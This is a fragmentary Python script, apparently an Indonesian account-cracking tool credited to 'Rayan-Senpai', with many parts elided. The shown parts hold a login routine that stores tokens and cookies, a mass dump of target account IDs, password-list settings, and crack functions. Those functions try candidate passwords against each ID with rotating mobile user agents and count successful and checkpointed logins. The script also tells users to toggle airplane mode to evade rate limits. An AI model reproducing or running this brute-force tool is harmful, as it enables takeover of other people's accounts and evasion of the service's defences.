...
for xd in range(10000):
    ...
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
...
def login_lagi334():
	try:
		...
		print(f'  {x}[{h}•{x}]{h} LOGIN SUCCESSFUL.........Jalankan ulang perintahnya!!!!{x} ');time.sleep(1)
		exit()
	except Exception as e:
		os.system("rm -f .token.txt")
		os.system("rm -f .cok.txt")
		print(f'  %s[%sx%s]%s LOGIN FAILED.....CEK AKUN LOO KONTOL !!%s'%(x,k,x,m,x))
		exit()
#------------------[ BAGIAN-MENU ]----------------#
def menu(my_name,my_id):
	...
	print(f'>> Github   : Rayan-Senpai')
	print(f'>> Version  : {H}1.01{x} ')
	print('')
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('>> jumlah target idz : '))
	except ValueError:
		print('>> wrong input ')
		exit()
	if jum<1 or jum>100:
...
def setting():
	print(f'\n{x}>> ID Order Setting ')
	print('')
	print(f'{x}1. ID Old ({M}Not Recommend{M}{x}){x} ')
	print(f'2. ID New  ({H}Recommended{H}{x}){x}  ')
	...
	if hc in ['1','01']:
		...
		method.append('mobile')
	print('')
	pwplus=input('>> Tambah Password Manual ( Y/t ) ')
	print('')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		cetak('Enter an additional password of at least 6 characters\nExample :[green] mrrayan123,mrrayan1234,mrrayan12345[white] ')
...
def passwrd():
	...
	print(f'>> Nyalakan Mode Pesawat Ketika 500 ID\n')
	...
	print('')
	print(f'\t{x}>>{k} Good Bye Terimakasih Jangan Lupa Follow {x} << ')
#--------------------[ METODE-MOBILE ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	...
	ua ='Mozilla/5.0 (Linux; Android 11; KB2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36'
	ua2 ='Mozilla/5.0 (Linux; Android 11; KB2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36'
	ses = requests.Session()
	for pw in pwv:
		try:
...
def crackmbasic(idf,pwv):
	...
	fff = '%'
	print('\r%s%s/%s ok : %s cp : %s %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
	ua = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/79.0.3945.73 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; KB2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36'])
	ua2 = random.choice(['Mozilla/5.0 (iPhone; CPU iPhone OS 14_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/79.0.3945.73 Mobile/15E148 Safari/604.1','Mozilla/5.0 (Linux; Android 9; Redmi Note 6 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 11; KB2000) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36'])
	ses = requests.Session()
	for pw in pwv:
		try:
